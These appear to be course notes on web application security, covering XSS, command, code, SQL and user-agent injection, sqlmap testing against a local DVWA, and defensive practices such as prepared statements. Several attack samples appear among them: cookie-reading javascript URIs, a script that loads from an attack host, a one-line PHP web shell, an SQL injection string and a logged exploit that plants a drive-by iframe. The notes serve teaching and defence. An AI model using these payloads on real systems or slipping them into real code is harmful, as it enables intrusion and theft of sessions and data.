# Web Script Security


## Injection
There are five types of attack by injection:
1. XSS Injection: Insert hidden links in your HTML pointing to malicious sites (attack
your user)
2. Code Injection: Insert hidden malicious code in your programme (attack your
specific application)
3. Command Injection: Install and/or execute malware in your server (attack your
server)
4. Data Injection: Execute queries to corrupt your data (attack your database)
5. User Agent Injection: DoS and security bypass attacks (attack your business)


Here, we will discuss three of them. XSS injection means modifying pages on a site
to include malicious code, unbeknownst to the site owner. Command injection is
executing commands on the server, inserted by the attacker through vulnerable
scripts. Command injection occurs when untrusted code is sent to an interpreter as
part of a vulnerable script.


## XSS Injection
The most common code injection is JavaScript injection, which is a process by which
we can insert and use our own JavaScript code in a page, either by entering the code
into the address bar, or by finding a cross-site scripting XSS vulnerability in a website.
The first technique normally exploits the JavaScript functions "alert" and "void".
Testing it is easy, just navigate to whatever site, and type in the web browser's
address bar for example:
```
javascript:void(document.bgColor="blue");
javascript:alert(document.cookie);
javascript:void(document.forms[0].name.value=1);
```

The second type of code injection is possible by the way the client browser has the
ability to interpret scripts embedded within HTML content enabled by default, so if an
attacker embeds script tags such `<SCRIPT>`, `<OBJECT>`, `<APPLET>`, or `<EMBED>`
into a web site, the web browser's JavaScript engine will execute it. Typical targets of
this type of injection are web pages where users can enter their own comments. For
example, if the design of the web site isn't parsing the comments inserted, and takes
'<' or '>' as real chars, a malicious user could type:

```
I like this site because <script>alert('Injected!');</script>
teaches me a lot
```

JavaScript that calls and runs scripts from an attack site:
```
<script type='text/javascript' src='http://malware-attacksite/js/x55.js'></script>
```

Sometimes the malicious code is cleverly obfuscated to avoid detection:
```
eval(base64_decode("aWYoZnVuaauUl+hasdHTgs+slgsfUNlsgasdf"));
```

Scripting that redirects the browser to an attack site:
```
<script>
if(document.referrer.match(/google\.com/)) {
window.location("http://malware-attack-site/");
}
</script>
```


## Cross-site Scripting (XSS) example

Alice is a user of Bob's website.
Bobs's website allows Alice to log in and use sensitive data.
Mallory observes that Bob's website contains a reflected XSS vulnerability.
Mallory crafts a URL to exploit the vulnerability, and sends Alice an email, enticing
her to click on a link for the URL under false pretenses. This URL will point to Bob's
website (either directly or through an iframe or ajax), but will contain Mallory's
malicious code, which the website will reflect.
Alice visits the URL provided by Mallory while logged into Bob's website.
The malicious script embedded in the URL executes in Alice's browser, as if it came
directly from Bob's server (this is the actual XSS vulnerability). The script can be
used to send Alice's session cookie to Mallory. Mallory can then use the session
cookie to steal sensitive information available to Alice (authentication credentials,
billing info, etc.) without Alice's knowledge.



## Command Injection
Command injection occurs when data is passed to server scripts via a web user
interface, which an attacker could use to inject system commands into these backend
scripts or upload malicious scripts on the server. There are a number of ways to string
system or shell commands together to create new commands, and attackers take
advantage of them. Be carefully in particular with these common operators:

Redirection Operators: `<, >>, >`
Pipes: `|`
Inline commands: `;, $`
Logical Operators: `$, &&, ||, etc.`

Finally, command injection can be more subtle than calling underlying operating
system functions. If it is possible to inject a new script, then the attacker will perform
command injections from that script. An attacker could simply upload a PHP file with a
single line to have full access to the system:

```
<?php
echo shell_exec('cat '.$_GET['command']);
?>

```


In fact many types of attacks, including SQL Injection, have command injection as an
end primary goal to gaining control of the server. Check the Slides presented in class
for a full description of the techniques you can use to prevent command injections.

## Penetration test
A penetration test, colloquially known as a pen test, is an authorized simulated attack
on a computer system, performed to evaluate the security of the system. The test is
performed to identify both weaknesses (also referred to as vulnerabilities), including the
potential for unauthorized parties to gain access to the system's features and data

Pen testers would probably start with mapping out all available IPs and ports to find out
what services are running on a server. We however are going to concentrate on the
simplest approach - we’re going to try to attack a server through a website, because a
submitted form sends information to the server and probability is high that the server
will respond through the website with something in return.

Sometimes web applications need to communicate with the underlying operating
system. This can either be to run system commands or to start applications written in
another programming language, such as shell, or execute a python script. In order to do
this, there are functions available that can execute a command that is passed to them
as a shell command. While that is very useful functionality it is equally dangerous when
not used correctly, and can lead to being attacked with comand injections.


# Code Injection
Code injection is a vulnerability that allows an attacker to inject custom code into a
server-side script or web application. This vulnerability occurs when an attacker can
control all or part of an input string that is fed into a function that can execute input
string as code. The typical vulnerability in PHP is using the eval() function to execute
its argument as code.

The primary causes of Code Injection are Input Validation failures, the inclusion of
untrusted input in any context where the input may be executed as valid code, failures
to secure source code repositories, failures to exercise caution in downloading thirdparty 
libraries, and server misconfigurations, which could allow non-PHP files to be
passed to the PHP interpreter by the web server. Particular attention should be paid to
the final point as it means that all files uploaded to the server by untrusted users can
pose a significant risk.

PHP is well known for being vulnerable to code injection because the way how it allows
external code to be inserted in web applications. For example, the most obvious target
for a Code Injection attack are the include(), include\_once(), require() and require_once() 
functions. If untrusted input is allowed to determine the path, parameter passed to these 
functions it is possible to influence which local file will be included. It should be noted 
that the included file need not be an actual PHP file; any included file that is capable of 
carrying textual data (e.g. almost anything) is allowed. The path parameter may also be 
vulnerable to a Directory Traversal or Remote File Inclusion. Using the ../ or ..(dot-dot-slash) 
string in a path allows an attacker to navigate to almost any file accessible to the PHP process. 
Another vulnerable function is eval(). In fact, you should never use it. PHP’s eval() function 
accepts a string of PHP code to be executed.

The Regular Expression PHP function preg\_replace() allows for an “e” (PREG\_REPLACE_EVAL) 
modifier which means the replacement string will be evaluated as PHP after substitution. 
Untrusted input used in the replacement string could therefore inject PHP code to be executed.

Web applications, by definition, will include various files necessary to service any given
request. By manipulating the request path or its parameters, it may be possible to
provoke the server into including unintended local files by taking advantage of flawed
logic in its routing, dependency management, auto loading or other processes.
Such manipulations outside of what the web application was designed to handle can
have unforeseen effects. For example, an application might unwittingly expose routes
intended only for command line usage. The application may also expose other classes
whose constructors perform tasks (not a recommended way to design classes but it
happens). Either of these scenarios could interfere with the application’s backend
operations leading to data manipulation or a potential for Denial Of Service (DOS)
attacks on resource intensive operations not intended to be directly accessible.
The best way to prevent code injection is by making sure that all your scripts properly
sanitize user input before using it.

## Brute Force attack:
A brute-force attack is a cryptanalytic attack that can, in theory, be used to attempt to
decrypt any data. Brute-force is used when it is not possible to take advantage of other
weaknesses in an encryption system (if any exist) that would make the task easier.
In practice, a brute force attack is a trial-and-error method used to generate a large
number of consecutive guesses as to the value of the desired data.

When password-guessing, this method is very fast when used to check all short
passwords, but for longer passwords takes too long (longer passwords, passphrases
and keys have more possible values, making them exponentially more difficult to crack
than shorter ones). So, brute-force attacks can be made less effective by obfuscating
the data to be encoded making the attacker do more work to test each guess.
In theory, anything could be hacked with brute-force. Hence, one of the measures of the
strength of an encryption system is how long it would theoretically take an attacker to
mount a successful brute-force attack against it.

Brute-force software is based on a fast search algorithm, implementing the general
problem-solving technique of enumerating all candidates and checking each one.

# Data (SQL) Injection
SQL Injection is the result of lax input validation, where user data is allowed to be used
in SQL queries without proper validation and screening. The insidious query may
attempt inserting, modifying or deleting data from the database.
For example, say you have an HTML form that requires a username and password.
Each of these form fields are named “user” and “pass” respectively. Imagine that your
server-side script uses the value of those files directly in this sentence:

```
$query = “SELECT * FROM myusers WHERE username = ‘$user’ AND password
= ‘$pass’”;
```

Under normal circumstances the SQL query will work nicely; but it is vulnerable to SQL
injection because it is using the values of $user and $pass without previous
sanitization. If a hacker enter:

```
‘xxx OR 1=1;--random_password as the value for “user”, your sentence would
actually be run is shown here:
$query = “SELECT * FROM myusers WHERE username = ‘xxx’ OR 1=1; --random_password’ AND
password = ‘$pass’”;
```


To understand the practical danger in this query, you have to understand that two
dashes (--) is equivalent to the comment. Everything after the -- is ignored by MySQL
so it doesn’t matter if invalid password is provided. Also, because you haven’t
“escaped” the single quote in the username, the single quote becomes the “end” of the
value being checked against the username field. By adding an OR 1=1 (which is always
true) into the query the attacker can access your protected application because the
SQL will always evaluate as true as 1 is always equals to 1.


The best way to prevent SQL injection is using prepared statements and
parameterized queries. These are SQL statements that are sent to and parsed by the
database server separately from any parameters. This way it is impossible for an
attacker to inject malicious SQL.
Example of using prepared statements with PDO (PHP Data Object) :

```
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');
$stmt->execute(array(':name' => $name));
foreach ($stmt as $row) {
// do something with $row
}
```


Before using prepared statements make sure to disable the default emulation of
prepared statements. An example of creating a connection using PDO is:
```
$dbConnection = new PDO('mysql:dbname=dbtest;host=127.0.0.1;charset=utf8',
'user', 'pass');
$dbConnection->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```


The error mode is optional, but it will give the developer the chance to catch any
error(s) which are thrown as PDOExceptions. The setAttribute() line makes sure that
the statement and the values aren't parsed by PHP before sending it to the MySQL
server (giving a possible attacker no chance to inject malicious SQL).

That is the way how the “prepare” sentence works. The SQL statement you pass to
prepare is parsed and compiled by the database server. By specifying parameters
(either a ? or a named parameter like :name in the example above) you tell the
database engine where you want to filter on. Then when you call execute the prepared
statement is combined with the parameter values you specify. The important thing is
that the parameter values are combined with the compiled statement, not a SQL string.
SQL injection works by tricking the script into including malicious strings when it creates
SQL to send to the database. So by sending the actual SQL separately from the
parameters you limit the risk of ending up with something you didn't intend. Any
parameters you send when using a prepared statement will just be treated as strings
(although the database engine may do some optimization so parameters may end up
as numbers too, of course). In the example above, if the $name variable contains
'Sarah'; DELETE * FROM employees the result would simply be a search for the
string "'Sarah'; DELETE * FROM employees", and you wouldn’t end up with an empty
table!


Another benefit with using prepared statements is that if you execute the same
statement many times in the same session it will only be interpreted once, giving you
some speed gains.

Here is an example of inserting data using prepared sentences:

```
$preparedStatement = $db->prepare('INSERT INTO table (column) VALUES
(:column)');
$preparedStatement->execute(array(':column' => $unsafeValue));
```



## Using automated penetration testing scanner - SQLmap as example
Sqlmap is a popular open source penetration testing tool that automates the process of
detecting and exploiting SQL injection flaws and taking over of database servers.
Sqlmap supports the HTTP cookie features so it can be useful in two ways:
- Authentication based upon cookies when the web application requires that.
- Detection and exploitation of SQL injection on such header values.

By default sqlmap tests all GET parameters and POST parameters. When the value of
–level is set to 2 or above it tests also HTTP Cookie header values. When this value is
set to 3 or above, it tests also HTTP User-Agent and HTTP Referer header value for
SQL injections. It is however possible to manually specify a comma-separated list of
parameter(s) that you want sqlmap to test. This will bypass the dependence on the
value of –level too.


| Tested HTTP parameter | Level in sqlmap |
|:-- |:-- |
|GET |1 (Default) |
|POST |1 (Default) |
|HTTP| Cookie 2 ≥ |
|HTTP| User-Agent 3 ≥ |
|HTTP |Referer 3 ≥  |


For instance, to test for GET parameter id and for HTTP User-Agent only, provide -p
id,user-agent.
This is an example of how we can test the parameter named security of an HTTP
Cookie of the DVWA (Damn Vulnerable Web Application).

```
./sqlmap.py -u
'http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#'
--cookie='PHPSESSID=0e4jfbrgd8190ig3uba7rvsip1; security=low'
--string='First name' --dbs --level 3 -p PHPSESSID
```

The flag –string compare between the valid pages and the invalid one (due to the
injection). In the other hand, the flag –dbs is used to enumerate the database
management systems. Finally, the flag –p force the testing of the PHPSESSID variable.

Other useful penetration testing scanners are Arachni, IBM AppScan, Acunetix WVS and
NTOSpider.

User Agent Injection
The User Agent field is part of the HTTP request header that is associated to every
webpage. The User Agent is a browser textual string containing data about the browser
model, compatibility, working system, any modifying plugins, among other information.
Using this knowledge, a web site can assess the capabilities of your computer in order
to optimise the rendering of the website content on your browser. The HTTP header
User agent field will always give the software program used by the original client. This is
for statistical purposes and the tracing of protocol violations. The first white space
delimited word must be the software product name, with an optional slash and version
designator.

Due to the configuration processing of PHP, an attacker can inject their own PHP code
into the User-Agent field and have it execute by the web application. What is interesting
about this attack technique is that it is very similar in exploit theory to reflected Crosssite Scripting (XSS) 
attacks. In this case, however, the web application is the one executing the reflected code 
and not the end user's web browser. Here is an example of an attack:


```
202.131.112.69 - - [12/Dec/2012:06:38:19 +0200] "GET
//index.php?option=com_svmap&controller=../../../../../../../../../../.
./../../../../proc/self/environ%00 HTTP/1.1" 404 292 "-" "<?php
echo(\"KURWA\"); file_put_contents(\"./index.php\",
base64_decode(\"Pz48aWZyYW1lIHNyYz0iaHR0cDovL3p1by5wb2Rnb3J6Lm9yZy96dW8
vZWxlbi9pbmRleC5waHAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIGZyYW1lYm9yZGVyPSIwIj
48L2lmcmFtZT48P3BocA==\"), FILE_APPEND); ?>"
```


The end portion (start with the `<?php`) of the Apache access_log file shows that the attacker has placed PHP code within the User-Agent field of the request. What does this code do?

1. It echoes the string "KURWA" back in the response. It is assumed that this is
simply a beacon call to let the attacker know that the code has been executed
(which means the site is potentially vulnerable).

2. Uses the PHP function called file\_put_contents which is used to write data to a
file.

3. The attacker’s goal is to append the base64 encoded string to the end of the
existing index.php file.
The base64-encoded string decodes to:

```
?><iframe src="http://zuo.podgorz.org/zuo/elen/index.php" width="0"
height="0" frameborder="0"></iframe><?php
```

The purpose, therefore, of this particular attack is to insert a drive-by-download invisible
IFRAME onto the end of the index.php file. The remote site would most likely be serving
some type of malware kit such as Blackhole. Adding malware links is but only one
option however. Other exploit examples could include using wget/curl to download a
backdoor webshell.
Cookies and other stored HTTP headers should be treated by developers as another
form of user input and be subjected to the same validation routines.


# Sensitive Data Exposure
IT systems usually save in a database user’s personal information such as passwords,
credit card numbers, house address’, telephone number, id number etc. When the
system is not protected effectively from unauthorised access or it doesn’t use
encryption to store sensitive data, there is a high probability that a hacker might exploit
that vulnerability and steal that information. That vulnerability is called “Sensitive Data
Exposure”.

The first thing you have to determine is which data is sensitive enough to require extra
protection. For example, passwords, credit card numbers, health records, and personal
information should be transmitted over the net using the SSH secure protocol and
stored using up-to-date and reliable cryptographic algorithms. Also, you should never
use cookies or hidden form fields to store or transmit sensitive data.



# Using Components with unknown vulnerabilities
Components, such as libraries, frameworks, and other software modules, usually run
with full privileges. If a vulnerable component is exploited, such an attack can facilitate
serious data loss or server takeover. Applications using components with known
vulnerabilities may undermine application defences and enable a range of possible
attacks and impacts.

Determining if you are vulnerable requires monitoring the developments of the external
software you are using in your application, as well as keeping abreast of project mailing
lists and announcements for anything that might be a vulnerability. In theory, it ought to
be easy to figure out if you are currently using any vulnerable components or libraries.
Unfortunately, vulnerability reports for commercial or open source software do not
always specify exactly which versions of a component are vulnerable in a standard,
searchable way.

One extreme option is not to use components that you didn’t write. However, that is not
realistic. Nowadays you must use software developed by others in your applications. It
is important that you carefully verify the provenance of any software that you plan to
use in your own applications. In general, Open Source hosted at the Apache
Foundation is reliable and safe. Others trustable Open Source hosting providers are
GitHub, Google Code and SourceForge. It is equally important that you keep up-to-date
the versions of the external software used by your scripts. Most software projects do not
create vulnerability patches for old versions. Instead, most simply fix the problem in the
next version. So upgrading to these new versions is critical. 


# Web Security Best Practices
- Fighting against hacking is a never-ending process and the best strategy is to
prevent it from happening in the first place.
- Never utilize user input in a system level command.
- Do not rely on client-side JavaScript validation whenever possible.
- Always validate the user input at server side using a secure algorithm.
- Don’t store sensible data into cookies. If you need to store data in cookies, store
them with a hash signature generated with a server side key.
- Do not use dynamic DOM element generation using user data input.
- Remove special HTML chars, so injected tags will be maintained in the website, but
will not be executed
- Make use of built PHP functions such as strip_tags() PHP function, htmlentities(),
urlencode(), or htmlspecialchars()
- Always validate file uploads using all the tools and functions available for you to
check files (e.g. mime_content\_type or Fileinfo).
- Only use trustable Third-Party Libraries in your code and keep them up-to-date.
